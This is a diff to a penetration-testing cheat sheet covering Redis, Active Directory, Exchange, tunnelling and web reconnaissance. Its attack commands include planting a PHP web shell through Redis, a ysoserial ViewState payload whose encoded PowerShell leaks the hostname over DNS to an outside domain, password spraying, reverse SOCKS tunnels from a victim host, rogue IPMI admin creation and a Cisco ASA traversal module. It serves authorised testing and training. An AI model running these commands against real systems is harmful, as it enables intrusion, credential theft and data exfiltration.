@@ -1615,6 +1615,18 @@ quit
 Connection closed by foreign host.
 ```
 
+Sensitive injection points for testing:
+
+```
+/var/www/html
+/home/redis/.ssh
+/var/lib/redis/.ssh
+/var/spool/cron/crontabs
+/var/spool/cron
+
+$ for dname in `cat dirs.txt`; do redis-cli -h 127.0.0.1 config set dir $dname | grep OK && echo $dname; done
+```
+
 
 
 ### Web Shell
@@ -1625,13 +1637,15 @@ Connection closed by foreign host.
 $ redis-cli -h 127.0.0.1 flushall
 $ redis-cli -h 127.0.0.1 set pwn '<?php system($_REQUEST['cmd']); ?>'
 $ redis-cli -h 127.0.0.1 config set dbfilename shell.php
-$ redis-cli -h 127.0.0.1 config set dir /var/www/html/
+$ redis-cli -h 127.0.0.1 config set dir /var/www/html
 $ redis-cli -h 127.0.0.1 save
 ```
 
 
 
-### Inject SSH PubKey
+### SSH Public Key
+
+* [https://github.com/Avinash-acid/Redis-Server-Exploit](https://github.com/Avinash-acid/Redis-Server-Exploit)
 
 ```
 $ ssh-keygen -t ecdsa -s 521 -f key
@@ -2152,7 +2166,7 @@ Install:
 $ git clone https://github.com/fox-it/mitm6 ~/tools/mitm6 && cd ~/tools/mitm6
 $ python3 setup.py install
 Or
-$ pipx install "git+https://github.com/fox-it/mitm6.git" -f
+$ pipx install -f "git+https://github.com/fox-it/mitm6.git"
 ```
 
 Run:
@@ -2652,6 +2666,17 @@ PS > Discover-PSMSSQLServers | Select ServerName,Description | Tee-Object mssql.
 
 
 
+### DC IPs
+
+Query DC for forest/domain FQDN to get corresponding DC IP addresses:
+
+```
+$ dig @10.10.13.37 megacorp.local
+$ dig @10.10.13.37 child.megacorp.local
+```
+
+
+
 
 ## NetBIOS Scanning
 
@@ -2995,7 +3020,7 @@ $ pipenv install -r requirements.txt && pipenv shell
 
 ```
 $ lookupsid.py MEGACORP/snovvcrash:'Passw0rd!'@127.0.0.1 20000 | tee ~/workspace/log/lookupsid.out
-$ cat ~/workspace/log/lookupsid.out | grep SidTypeUser | grep -v '\$' | awk -F'\' '{print $2}' | awk '{print $1}' > ~/workspace/enum/allusers.txt
+$ cat ~/workspace/log/lookupsid.out | grep SidTypeUser | grep -v -e '\$' -e HealthMailbox | awk -F'\' '{print $2}' | awk '{print $1}' | perl -nle 'print if m{^[[:ascii:]]+$}' > ~/workspace/enum/allusers.txt
 ```
 
 
@@ -3008,6 +3033,12 @@ $ cat ~/workspace/log/lookupsid.out | grep SidTypeUser | grep -v '\$' | awk -F'\
 $ cd ~/workspace/enum/
 $ adidnsdump -u 'megacorp.local\snovvcrash' -p 'Passw0rd!' DC01.megacorp.local
 $ mv records.csv adidnsdump.csv
+```
+
+Check with ldapsearch:
+
+```
+$ ldapsearch -H ldap://10.10.13.37:389 -x -D 'CN=snovvcrash,CN=Users,DC=megacorp,DC=local' -w 'Passw0rd!' -s sub -b 'DC=megacorp.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=megacorp,DC=local' '(objectClass=*)' dnsRecord dNSTombstoned name
 ```
 
 
@@ -3023,8 +3054,10 @@ $ pipenv install && pipenv shell
 (CrackMapExec) $ sudo ln -s /home/snovvcrash/.virtualenvs/CrackMapExec/bin/crackmapexec /usr/bin/CME
 (CrackMapExec) $ CME smb 127.0.0.1 -u 'anonymous' -p ''
 Or
+$ pip3 install pipx
+$ pipx ensurepath
 $ pipx install crackmapexec
-$ pipx run crackmapexec smb 127.0.0.1 -u 'anonymous' -p ''
+$ pipx run crackmapexec smb 127.0.0.1 -u 'anonymous' -p '' (or just "cme smb ...")
 ```
 
 Use:
@@ -3598,7 +3631,7 @@ Add new admin user (only existing admin username is needed):
 $ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U ADMIN -P DummyPassw0rd user set name <ID> snovvcrash
 $ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U ADMIN -P DummyPassw0rd user set password <ID> 'Passw0rd!'
 $ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U ADMIN -P DummyPassw0rd user priv <ID> 4
-$ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U ADMIN -P DummyPassw0rd user enable <ID> 3
+$ ipmitool -I lanplus -C 0 -H 127.0.0.1 -U ADMIN -P DummyPassw0rd user enable <ID>
 ```
 
 
@@ -3837,7 +3870,7 @@ $ ldapsearch -h 127.0.0.1 -x -b "dc=megacorp,dc=local" '(ms-MCS-AdmPwd=*)' ms-MC
 Simple authentication with ldapsearch:
 
 ```
-$ ldapsearch -H ldap://127.0.0.1:389/ -x -D 'CN=username,CN=Users,DC=megacorp,DC=local' -w 'Passw0rd!' -s sub -b 'DC=megacorp,DC=local' | tee ldapsearch.out
+$ ldapsearch -H ldap://127.0.0.1:389 -x -D 'CN=snovvcrash,CN=Users,DC=megacorp,DC=local' -w 'Passw0rd!' -s sub -b 'DC=megacorp,DC=local' | tee ldapsearch.out
 ```
 
 Analyze large output for anomalies by searching for unique strings:
@@ -3911,7 +3944,13 @@ $ nmap -n -Pn -sV --script ldap-brute 127.0.0.1 -p389
 
 
 
-### Recon
+### Filesystem
+
+Grep for sensitive keywords:
+
+```
+$ grep -nir passwd /etc/ 2>/dev/null
+```
 
 Find and list all files newer than `2020-03-16` and not newer than `2020-03-17`:
 
@@ -4952,8 +4991,8 @@ $ python -m peas --brute-unc -u 'MEGACORP\snovvcrash' -p 'Passw0rd!' mx.megacorp
 ```
 Get ViewStateUserKey: Browser → F12 → Storage → ASP.NET_SessionId
 Get ViewStateGenerator: Browser → F12 → Console → document.getElementById("__VIEWSTATEGENERATOR").value
-PS > [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('$name = hostname;nslookup "$name.0000000000ffffffffff.d.zhack.ca"'))
-PS > .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -exec bypass -enc cwBjACAALQBwAGEAdABoACAAIgBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABlAG0AcABcAHAAbwBjAC4AdAB4AHQAIgAgAC0AdgBhAGwAdQBlACAAIgBDAFYARQAtADIAMAAyADAALQAwADYAOAA4ACAAQQBiAHUAcwBlACAAUABvAEMALgAuAC4AIgAKAA===" --validationalg "SHA1" --validationkey "CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --viewstateuserkey "<VIEWSTATE>" --generator "<GENERATOR>" --islegacy --isdebug
+PS > [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('$name = hostname;nslookup "$name.0000000000ffffffffff.d.zhack.ca"'))
+PS > .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -exec bypass -enc <BASE64_CMD>" --validationalg "SHA1" --validationkey "CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --viewstateuserkey "<VIEWSTATE>" --generator "<GENERATOR>" --islegacy --isdebug
 https://mx.megacorp.com/ecp/default.aspx?__VIEWSTATEGENERATOR=<GENERATOR>&__VIEWSTATE=<VIEWSTATE>
 ```
 
@@ -5036,6 +5075,17 @@ Notes:
 
 * In users.txt there's only "username" on a line, not "DOMAIN\username".
 * Errors like `ERROR: 04:27:43 brute.go:193: An error occured in connection - Get https://autodiscover.megacorp.com/autodiscover/autodiscover.xml: Get https://autodiscover.megacorp.com/autodiscover/autodiscover.xml: net/http: request canceled` do **not** affect the current password probe.
+
+
+#### ADFSpray
+
+* [https://github.com/xFreed0m/ADFSpray](https://github.com/xFreed0m/ADFSpray)
+
+Spray at autodiscover (NTLM auth) endpoint:
+
+```
+$ python3 ADFSpray.py -U users.txt -p 'Passw0rd!' -t 'https://autodiscover.megacorp.com/autodiscover/autodiscover.xml' autodiscover
+```
 
 
 
@@ -5312,8 +5362,8 @@ root@kali:$ ./chisel client 127.0.0.1:8001 1080:socks
 Socks5 proxy with Chisel in client mode:
 
 ```
-root@kali:$ ./chisel server -p 8000 --reverse --socks5
-alice@victim:$ ./chisel client 10.10.13.37:8000 R:socks
+root@kali:$ ./chisel server -p 8000 --reverse --socks5 [--fingerprint <BASE64_STRING>]
+alice@victim:$ ./chisel client 10.10.13.37:8000 R:socks [--auth snovvcrash:'Passw0rd!']
 ```
 
 
@@ -5370,6 +5420,24 @@ $ python rdp2tcp.py add reverse 127.0.0.1 1080 127.0.0.1 9003
 Other `xfreerdp` tips:
 
 * Disable NLA with `-sec-nla` switch if user's password is expired.
+
+
+
+
+## proxychains-ng
+
+* [https://github.com/rofl0r/proxychains-ng](https://github.com/rofl0r/proxychains-ng)
+
+Install:
+
+```
+$ git clone https://github.com/rofl0r/proxychains-ng ~/tools/proxychains-ng && cd ~/tools/proxychains-ng
+$ ./configure --prefix=/usr --sysconfdir=/etc
+$ make
+$ sudo make install
+$ sudo make install-config
++ edit /etc/proxychains.conf
+```
 
 
 
@@ -6922,13 +6990,13 @@ tar -xvjf directory.tar.bz
 Local file to a remote system:
 
 ```
-$ scp file.txt snovvcrash@10.10.13.37:/remote/directory
+$ scp [-P 2222] file.txt snovvcrash@10.10.13.37:/remote/directory
 ```
 
 Remote file to a local system:
 
 ```
-$ scp snovvcrash@10.10.13.37:/remote/file.txt /local/directory
+$ scp [-P 2222] snovvcrash@10.10.13.37:/remote/file.txt /local/directory
 ```
 
 
@@ -6954,7 +7022,7 @@ $ 7z e packed.7z -p"p4sSw0rD"
 Recursive grep:
 
 ```
-$ grep -rnw /path/to/dir -e 'pattern'
+$ grep -nwr 'pattern' /path/to/dir
 ```
 
 Recursive find and replace:
@@ -7609,6 +7677,18 @@ $ curl 'http://10.10.13.37/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=
 
 
 
+### wpscan
+
+* [https://github.com/wpscanteam/wpscan](https://github.com/wpscanteam/wpscan)
+* [https://wpscan.com/profile](https://wpscan.com/profile)
+
+```
+$ wpscan --url http://10.10.13.37/wp/ --api-token <API_TOKEN> --force -e ap
+$ wpscan --url http://10.10.13.37/wp/ --api-token <API_TOKEN> --force --passwords /usr/share/seclists/Passwords/darkweb2017-top1000.txt
+```
+
+
+
 
 ## GitLab
 
@@ -7768,7 +7848,7 @@ $ cat nmap/tcp.xml | ./aquatone -out 10.0-255.0-255.0-255_nmap
 
 
 
-### Amass
+### amass
 
 * [https://github.com/OWASP/Amass/releases](https://github.com/OWASP/Amass/releases)
 * [https://snovvcrash.github.io/2020/05/10/subdomain-discovery.html](https://snovvcrash.github.io/2020/05/10/subdomain-discovery.html)
@@ -7780,7 +7860,7 @@ $ amass enum -active -brute -config config.ini -df domains.txt -ipv4 -src -v -o 
 
 
 
-### Subfinder
+### subfinder
 
 * [https://github.com/projectdiscovery/subfinder/releases](https://github.com/projectdiscovery/subfinder/releases)
 
@@ -7790,7 +7870,7 @@ $ subfinder -all -config config.yaml -d hackerone.com -o subdomains.txt [-oI -nW
 
 
 
-### ShuffleDNS
+### shuffledns
 
 * [https://github.com/projectdiscovery/shuffledns/releases]https://github.com/projectdiscovery/shuffledns/releases)
 
@@ -7800,13 +7880,23 @@ $ shuffledns -d hackerone.com -r /opt/dnsvalidator/resolvers.txt -w /usr/share/c
 
 
 
-### MassDNS
+### massdns
 
 * [https://github.com/blechschmidt/massdns](https://github.com/blechschmidt/massdns)
 * [https://github.com/vortexau/dnsvalidator](https://github.com/vortexau/dnsvalidator)
 
 ```
 $ massdns -r /opt/dnsvalidator/resolvers.txt domains.txt -w domains-resolved.txt -o S
+```
+
+
+
+### chaos
+
+* [https://github.com/projectdiscovery/chaos-client](https://github.com/projectdiscovery/chaos-client)
+
+```
+$ chaos -d megacorp.com -key <API_KEY> -http-status-code -http-title -http-url -o chaos.out
 ```
 
 
@@ -7832,7 +7922,7 @@ $ httpx -l domains.txt -vhost -http2 -pipeline -title -content-length -status-co
 
 
 
-### Nikto
+### nikto
 
 * [https://github.com/sullo/nikto](https://github.com/sullo/nikto)
 
@@ -7842,14 +7932,17 @@ $ nikto -h http://127.0.0.1 -Cgidirs all
 
 
 
-### WPScan
 
-* [https://github.com/wpscanteam/wpscan](https://github.com/wpscanteam/wpscan)
-* [https://wpscan.com/profile](https://wpscan.com/profile)
+## Cisco
+
+
+
+### ASA Path Traversal
+
+**CVE-2020-3452**
 
 ```
-$ wpscan --url http://10.10.13.37/wp/ --api-token <API_TOKEN> --force -e ap
-$ wpscan --url http://10.10.13.37/wp/ --api-token <API_TOKEN> --force --passwords /usr/share/seclists/Passwords/darkweb2017-top1000.txt
+msf > use auxiliary/scanner/http/cisco_directory_traversal
 ```
 
 
